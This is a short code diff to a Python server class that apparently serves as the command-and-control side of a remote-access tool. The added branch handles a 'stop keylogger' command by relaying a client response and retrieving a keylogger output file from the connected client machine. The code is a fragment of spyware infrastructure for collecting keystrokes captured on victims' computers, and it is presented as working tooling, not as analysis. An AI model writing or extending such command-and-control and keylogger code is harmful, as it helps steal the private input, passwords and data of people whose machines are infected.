@@ -193,6 +193,11 @@ class Server:
                 print(e)
                 print(data)
 
+        elif command.startswith("stop keylogger"):
+            self.web_server_socket.send(sock.recv(50))
+            self.receive_file_from_client("C:\\C_projects\\KeyloggerFile.txt", sock)
+
+
         elif command == 'exit':
             return
 
